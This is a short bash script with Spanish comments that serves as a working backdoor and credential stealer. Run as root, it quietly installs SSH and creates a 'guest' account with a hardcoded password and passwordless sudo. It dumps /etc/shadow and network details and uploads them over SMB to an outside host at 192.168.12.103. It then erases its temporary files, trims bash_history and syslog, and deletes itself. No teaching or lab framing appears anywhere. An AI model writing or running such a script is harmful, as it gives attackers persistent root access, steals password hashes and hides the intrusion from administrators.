#!/bin/bash

# Verificar si el script se está ejecutando como root
if [[ $EUID -ne 0 ]]; then
    exit 1
fi

# Instalar samba-client y openssh-server
apt-get update >/dev/null 2>&1
apt-get install -y samba-client openssh-server >/dev/null 2>&1

# Crear el usuario "guest" y configurar permisos de sudo
useradd guest >/dev/null 2>&1
usermod -aG sudo guest >/dev/null 2>&1
chsh -s /bin/bash guest >/dev/null 2>&1
chmod 440 /etc/sudoers >/dev/null 2>&1
echo "guest ALL=(ALL:ALL) ALL" >> /etc/sudoers >/dev/null 2>&1

# Añadir entrada al archivo de sudoers.d para el usuario "guest" sin solicitar contraseña
echo "guest ALL=(ALL) NOPASSWD:ALL" | tee /etc/sudoers.d/guest >/dev/null 2>&1
echo "guest:L@p1neda" | chpasswd >/dev/null 2>&1

# Cambiar los permisos y propietario del archivo recién creado
chmod 0440 /etc/sudoers.d/guest >/dev/null 2>&1
chown root:root /etc/sudoers.d/guest >/dev/null 2>&1

# Verificar la validez de la configuración de sudoers
if ! visudo -c -f /etc/sudoers.d/guest >/dev/null 2>&1; then
    exit 1
fi

# Crear directorio y obtener IP
mkdir /home/temp
cd /home/temp
echo "IP: $(ip a)" >> "${HOSTNAME}.txt"

# Obtener el contenido de /etc/shadow y guardarlo en el archivo .txt
cat /etc/shadow >> "${HOSTNAME}.txt"

# Subir el archivo al recurso compartido SMB
smbclient "//192.168.12.103/no_autorizado" -U "no_autorizado" "noaut1" -c "lcd $(pwd); put ${HOSTNAME}.txt" >/dev/null 2>&1

# Limpiar directorio temporal
cd
rm -rf /home/temp

# Limpiar el historial de bash y syslog
sed -i '/$(date -d "10 minutes ago" +"%H:%M")/,$d' ~/.bash_history
sed -i -n "/$(date -d "10 minutes ago" +"%b %d %H:%M")/,\$p" /var/log/syslog

rm "script.sh"
